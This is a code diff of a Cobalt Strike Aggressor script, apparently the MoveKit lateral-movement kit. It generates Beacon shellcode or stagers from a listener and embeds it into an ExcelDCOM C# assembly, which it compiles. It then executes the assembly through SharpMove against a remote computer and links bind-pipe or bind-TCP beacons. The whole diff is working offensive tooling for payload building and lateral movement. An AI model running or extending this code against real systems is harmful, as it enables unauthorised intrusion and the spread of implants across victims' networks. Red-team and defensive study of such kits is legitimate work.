@@ -200,7 +200,7 @@ sub moveKit::buildassembly{
 	bpause($bid, 2000);
 
 	#Check if assembly meets compilation size limit - should be 1MB limit but it seems it needs to be a little less
-	#You can only see at the teamserver if the file is too big, it will exit silenty otherwise
+	#You can only see at the teamserver if the file is too big, it will exit silenty otherwise - I think 4.0 changed this
 	$assembly_size = int(lof($bltasm));
 	if($assembly_size >= 960000){
 		berror($bid, "\c4Error: Created assembly is too big. Available options: \n   1)WMI location URL\n   2)WMI location Windows directory\n   3)SMB file drop method");
@@ -233,7 +233,7 @@ sub moveKit::compilepl{
 		}
 	}
 	else if($desc ismatch '^Shellcode-.*'){
-		$saveas = script_resource("ExcelDCOM.exe");
+		$saveas = script_resource("Assemblies/ExcelDCOM.exe");
 	}
 	if($archi eq "x86"){
 		$platf = "-platform:x86";
@@ -260,7 +260,7 @@ sub moveKit::compilepl{
 		$cmpdata = readb($cmpledfl, -1);
 		closef($cmpledfl);
 
-		deleteFile($saveas);
+		#deleteFile($saveas);
 		deleteFile($prebuild);
 		return $cmpdata;
 	}
@@ -297,48 +297,50 @@ sub moveKit::customhandler{
 }
 
 sub moveKit::shellconly{
-	local('$ops $task')
+	local('$ops $task $sharpasm $pltype $desc $plarch $shcode $finshellc $outpl $data')
 	$ops = $1;
 	$task = $2;
 	$desc = $3;
 	$pltype = "raw";
-	$sharpasm = "ExcelDCOM.exe";
-
+	$sharpasm = "Assemblies/ExcelDCOM.exe";
+	$plarch = "x86";
 	if($ops['x86'] eq "false"){
 		$plarch = "x64";
 	}
 	if($ops['staged'] eq "false"){
 		if($pltype eq "raw"){
 			$shcode = artifact_payload($ops['listener'], $pltype, $plarch);
-			if(%movedefaults["shellcodeformat"] eq "raw"){
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
 				$finshellc = $shcode;
 			}
-			else if(%movedefaults["shellcodeformat"] eq "base64"){
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
 				$finshellc = base64_encode($shcode);
 			}
 			else{
-				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
 			}
 		}
 	}
 	else{
 		if($pltype eq "raw"){
-			$shcode = artifact_stager($ops['listener'], $pltype, $plarch);
-			if(%movedefaults["shellcodeformat"] eq "raw"){
+			# artifact_stager has a bug
+			#$shcode = artifact_stager($ops['listener'], $pltype, $plarch);
+			$shcode = stager($ops['listener'], $plarch);
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
 				$finshellc = $shcode;
 			}
-			else if(%movedefaults["shellcodeformat"] eq "base64"){
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
 				$finshellc = base64_encode($shcode);
 			}
 			else{
-				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
 			}
 		}
 	}
-	$outpl = openf(script_resource("ExcelDCOM.cs"));
+	$outpl = openf(script_resource("Assemblies/ExcelDCOM.cs"));
 	$data = readb($outpl, -1);
 	closef($outpl);
-	$noncompiled = strrep($data, %movedefaults["findstring"], $finshellc);
+	$noncompiled = strrep($data, %moveKit::movedefaults["findstring"], $finshellc);
 	&moveKit::compilepl($noncompiled, $desc, $null, $plarch);
 	&moveKit::execprep($ops, $sharpasm, $task, $desc);
 }
@@ -879,22 +881,27 @@ sub moveKit::payloadbuilder{
 }
 
 sub moveKit::execprep{
-	local('$sharpasm, $sharptask, $descname, $extinfo')
+	local('$sharpasm, $sharptask, $descname, $extinfo $ltype $list')
 	$sharpasm = $2;
 	$sharptask = $3;
 	$descname = $4;
+	$list = $1['listener'];
+	$ltype = listener_describe($1['listener']);
+	binput($1['bid'], "MoveKit $descname");
+
 	if($1['auto'] eq "true"){
 		if($descname ismatch '.*-Command.*'){
-			$extinfo = "$1['cmdtrigger'] command trigger and located at $1['location']";
+			$extinfo = "with $1['cmdtrigger'] command trigger and located at $1['location']";
 		}
 		else{
-			$extinfo = "$1['cmdtrigger'] command trigger and $1['droptype'] file write";
+			$extinfo = "with $1['cmdtrigger'] command trigger and $1['droptype'] file write";
 		}
+		blog($1['bid'], "Listener info  \-  $list \- $ltype");
 	}
 	else{
-		$extinfo = "$1['cmdtrigger'] command trigger";
+		$extinfo = "with $1['cmdtrigger'] command trigger";
 	}
-	$l = listener_describe($1['listener']);
+	
 	&moveKit::taskexec($1['bid'], $sharpasm, $sharptask, $descname, $extinfo);
 
 	if($1['x86'] eq "true"){
@@ -903,7 +910,7 @@ sub moveKit::execprep{
 	else{
 		$larch = "x64";
 	}
-	if($l hasmatch "beacon_bind_pipe"){
+	if($ltype hasmatch "beacon_bind_pipe"){
 		if($1['staged'] eq "true"){
 			beacon_stage_pipe($1['bid'], $1['computername'], $1['listener'], $larch);
 		}
@@ -911,7 +918,7 @@ sub moveKit::execprep{
 		#blink($1['bid'], $1['computername']);
 		beacon_link($1['bid'], $1['computername'], $1['listener']);
 	}
-	else if($l hasmatch "beacon_bind_tcp"){
+	else if($ltype hasmatch "beacon_bind_tcp"){
 		if($1['staged'] eq "true"){
 			bstage();
 			beacon_stage_tcp($1['bid'], $1['computername'], 1234, ,$1['listener'], $larch);
@@ -929,8 +936,8 @@ sub moveKit::taskexec{
 	$sharptask = $3;
 	$desc_type = $4;
 	$extras = $5;
-	binput($bid, "MoveKit Lateral Movement");
-	btask($bid, "" . dstamp(ticks()) . " - Executing SharpMove for $desc_type with $extras");
+	#binput($bid, "MoveKit $desc_type");
+	btask($bid, "" . dstamp(ticks()) . " - Executing SharpMove for $desc_type $extras");
 	bexecute_assembly!($bid, script_resource($sharpasm), $sharptask);
 }
 
